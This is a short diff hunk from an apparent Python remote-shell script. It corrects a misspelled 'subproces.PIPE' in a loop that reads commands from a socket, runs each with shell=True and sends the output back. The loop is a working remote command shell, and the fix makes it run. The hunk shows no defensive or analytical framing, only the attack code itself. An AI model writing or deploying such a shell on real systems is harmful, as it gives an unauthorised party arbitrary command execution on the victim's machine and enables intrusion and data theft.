@@ -11,6 +11,6 @@ sock.send("[*] Connection recieved.")
 while True:
 	data = sock.recv(1024).strip()
 	if data == 'quit': break
-	proc = subprocess.Popen(data, shell=True, stdin=subproces.PIPE, 
+	proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, 
 							stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 	sock.send(proc.stdout.read())
